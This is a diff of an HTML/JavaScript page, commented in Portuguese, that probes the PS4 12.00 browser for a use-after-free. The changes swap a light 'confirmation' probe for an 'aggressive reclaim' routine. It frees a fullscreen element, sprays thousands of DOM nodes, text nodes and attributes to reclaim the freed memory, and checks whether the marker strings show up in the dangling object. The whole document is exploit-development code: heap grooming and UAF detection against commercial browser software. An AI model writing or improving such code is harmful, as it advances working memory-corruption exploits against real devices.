@@ -1,51 +1,55 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Confirmation (Clean)</title>
+<title>PS4 12.00 - UAF Aggressive Reclaim (REAL TEST)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF Confirmation (No DOM Noise)</h2>
+<h2>PS4 12.00 - UAF Aggressive Reclaim (Real Validation)</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
 
 // ==========================
-// 🔒 SAFE LOG
+// 🔒 LOG SEGURO (ALERT)
+// ==========================
 let logBuffer = [];
-function log(msg){
+
+function log(msg) {
     try { console.log(msg); } catch(e){}
     logBuffer.push(msg);
 }
 
 // ==========================
-// HEAP PRESSURE (leve, sem poluir DOM)
-function heapPressure(){
-    let tmp = [];
-    for(let i=0;i<20000;i++){
-        tmp.push(new ArrayBuffer(0x1000));
+// HEAP SETUP (INALTERADO)
+// ==========================
+function setupHeap() {
+    let controllers = [];
+
+    for(let i = 0; i < 5000; i++) {
+        let arr = new Float64Array(8);
+        arr[0] = i;
+        controllers.push(arr);
     }
+
+    return controllers;
 }
 
 // ==========================
-// FULLSCREEN TARGET (SEM innerHTML!)
-function setupFullscreen(){
-
+// FULLSCREEN (INALTERADO)
+// ==========================
+function setupFullscreen() {
     let fsTarget = document.createElement("div");
 
-    // 🔒 SEM innerHTML → evita TextNode falso
-    fsTarget.textContent = "X";
+    fsTarget.innerHTML = "<h1>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
 
-    Object.assign(fsTarget.style,{
-        background:"black",
-        width:"100%",
-        height:"100%",
-        position:"absolute",
-        top:"0",
-        left:"0"
-    });
+    fsTarget.style.position = "absolute";
+    fsTarget.style.top = "0";
+    fsTarget.style.left = "0";
+    fsTarget.style.width = "100%";
+    fsTarget.style.height = "100%";
+    fsTarget.style.background = "black";
 
     document.body.appendChild(fsTarget);
 
@@ -55,104 +59,156 @@ function setupFullscreen(){
 }
 
 // ==========================
-// 🔬 DANGLING POINTER TEST
-function probe(fsTarget){
+// 💣 AGGRESSIVE RECLAIM REAL
+// ==========================
+function aggressiveReclaim() {
+    log("[*] Aggressive reclaim iniciado");
 
-    log("---- PROBE ----");
+    let bucket = [];
+
+    // Fase 1 — churn pesado
+    for (let i = 0; i < 8000; i++) {
+        let el = document.createElement("div");
+        document.body.appendChild(el);
+        el.remove();
+    }
+
+    // 🔥 Fase 2 — spray CONTROL (mesmo layout)
+    for (let i = 0; i < 12000; i++) {
+        let el = document.createElement("div");
+
+        el.innerHTML = "CONTROL_" + i;
+        el.style.position = "absolute";
+        el.style.width = "100%";
+        el.style.height = "100%";
+
+        document.body.appendChild(el);
+        bucket.push(el);
+    }
+
+    // 🔥 Fase 3 — TextNode spray
+    for (let i = 0; i < 8000; i++) {
+        let txt = document.createTextNode("TXT_" + i);
+        document.body.appendChild(txt);
+        bucket.push(txt);
+    }
+
+    // 🔥 Fase 4 — Attribute spray
+    for (let i = 0; i < 8000; i++) {
+        let el = document.createElement("div");
+        el.setAttribute("data-x", "ATTR_" + i);
+        document.body.appendChild(el);
+        bucket.push(el);
+    }
+
+    // 🔥 Fase 5 — churn final
+    for (let i = 0; i < 5000; i++) {
+        let el = document.createElement("span");
+        document.body.appendChild(el);
+        el.remove();
+    }
+
+    log("[*] Aggressive reclaim finalizado: " + bucket.length);
+    return bucket;
+}
+
+// ==========================
+// 🔬 DETECÇÃO REAL DE UAF
+// ==========================
+function checkUAF(fsTarget) {
+
+    log("---- UAF CHECK ----");
 
     try {
+        let html = fsTarget.innerHTML;
+        log("[CHECK] innerHTML = " + html);
 
-        // 🔹 Estado estrutural
-        log("[CHECK] isConnected = " + fsTarget.isConnected);
-        log("[CHECK] parent = " + fsTarget.parentNode);
-        log("[CHECK] nodeType = " + fsTarget.nodeType);
-
-        // 🔹 Acesso DOM
-        try {
-            let v = fsTarget.textContent;
-            log("[CHECK] textContent OK = " + v);
-        } catch(e) {
-            log("[UAF] textContent crash");
+        // 🎯 DETECÇÃO REAL
+        if (html && html.includes("CONTROL_")) {
+            log("[!!!] UAF CONFIRMADO - REUSE DETECTADO");
         }
 
-        // 🔹 Escrita
-        try {
-            fsTarget.textContent = "A";
-            log("[CHECK] write OK");
-        } catch(e) {
-            log("[UAF] write crash");
+        if (html === "X" || html.length === 1) {
+            log("[!!!] POSSIVEL CORRUPÇÃO DE STRING");
         }
 
-        // 🔹 Layout (muito importante)
-        try {
-            let r = fsTarget.getBoundingClientRect();
-            log("[CHECK] layout OK = " + r.width);
-        } catch(e) {
-            log("[UAF] layout crash");
-        }
+    } catch(e) {
+        log("[UAF] innerHTML crash");
+    }
 
-        // 🔹 Clone (acessa estrutura interna)
-        try {
-            let c = fsTarget.cloneNode(true);
-            log("[CHECK] clone OK");
-        } catch(e) {
-            log("[UAF] clone crash");
-        }
+    try {
+        let parent = fsTarget.parentNode;
+        log("[CHECK] parent = " + parent);
+    } catch(e) {
+        log("[UAF] parent crash");
+    }
 
-    } catch(e){
-        log("[UAF] acesso geral crash");
+    try {
+        let rect = fsTarget.getBoundingClientRect();
+        log("[CHECK] layout = " + rect.width);
+    } catch(e) {
+        log("[!!!] UAF CRASH EM LAYOUT");
+    }
+
+    try {
+        fsTarget.innerHTML = "A";
+        log("[CHECK] write OK");
+    } catch(e) {
+        log("[!!!] WRITE CORROMPIDO");
     }
 }
 
 // ==========================
 // TRIGGER (INALTERADO)
-function trigger(fsTarget){
+// ==========================
+function trigger(fsTarget) {
 
     log("[*] Trigger");
 
     try {
-
         fsTarget.remove();
 
-        if(document.webkitIsFullScreen || document.fullscreenElement){
+        if (document.webkitIsFullScreen || document.fullscreenElement) {
             document.webkitExitFullscreen?.();
         }
 
-    } catch(e){
-        log("[ERRO trigger]");
+    } catch(e) {
+        log("[ERRO]");
     }
 
-    // 🔥 pressão de heap pós-free
-    setTimeout(heapPressure, 0);
-    setTimeout(heapPressure, 50);
-    setTimeout(heapPressure, 100);
+    // 🔥 janela crítica REAL
+    setTimeout(() => aggressiveReclaim(), 0);
+    setTimeout(() => aggressiveReclaim(), 50);
+    setTimeout(() => aggressiveReclaim(), 100);
 
-    // 🔬 probes repetidos (importante)
-    setTimeout(()=>probe(fsTarget), 10);
-    setTimeout(()=>probe(fsTarget), 50);
-    setTimeout(()=>probe(fsTarget), 100);
-    setTimeout(()=>probe(fsTarget), 200);
+    // 🔬 múltiplas probes
+    setTimeout(() => checkUAF(fsTarget), 20);
+    setTimeout(() => checkUAF(fsTarget), 80);
+    setTimeout(() => checkUAF(fsTarget), 160);
+    setTimeout(() => checkUAF(fsTarget), 250);
 
-    // dump final
-    setTimeout(()=>{
+    // 📦 dump via alert (SEGURO)
+    setTimeout(() => {
         alert(logBuffer.join("\n"));
     }, 400);
 
-    // ⚠️ timing original
-    setTimeout(()=>location.reload(), 500);
+    setTimeout(() => location.reload(), 500);
 }
 
 // ==========================
-// MAIN
-function runTest(){
+// MAIN (INALTERADO)
+// ==========================
+function runTest() {
 
     log("[*] Iniciando teste");
 
+    let controllers = setupHeap();
     let fsTarget = setupFullscreen();
 
-    window.onblur = function(){
+    window.onblur = function() {
         log("[*] onblur");
-        setTimeout(()=>trigger(fsTarget), 3000);
+
+        setTimeout(() => trigger(fsTarget), 3000);
     };
 }
 
